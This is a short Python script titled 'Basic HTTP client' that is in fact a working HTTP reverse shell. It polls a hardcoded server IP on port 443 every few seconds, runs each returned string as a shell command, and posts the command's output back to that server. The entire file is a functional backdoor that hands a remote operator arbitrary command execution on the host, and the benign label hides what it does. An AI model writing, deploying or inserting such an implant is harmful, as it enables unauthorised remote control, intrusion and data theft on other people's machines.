#!/usr/bin/python
#-*- coding:utf-8 -*-



#Basic HTTP client


from requests import get    
from requests import post
from subprocess import Popen
from subprocess import PIPE
from os import chdir
from time import sleep

global host
host= 'http://192.168.101.143:443' #Server ip

while True: 

    req = get(host)                               
    command = req.text                             
        
    if 'quit' in command:
        break 

    
    else:
        if "cd" in command:
            chdir(command[3:])
            CMD =Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            post_response = post(url=host, data=CMD.stdout.read() )  
            post_response = post(url=host, data=CMD.stderr.read() )  
            
        else:
            CMD =Popen(command, shell=True, stdout=PIPE, stderr=PIPE, stdin=PIPE)
            post_response = post(url=host, data=CMD.stdout.read() )  
            post_response = post(url=host, data=CMD.stderr.read() )  

    sleep(3)
    



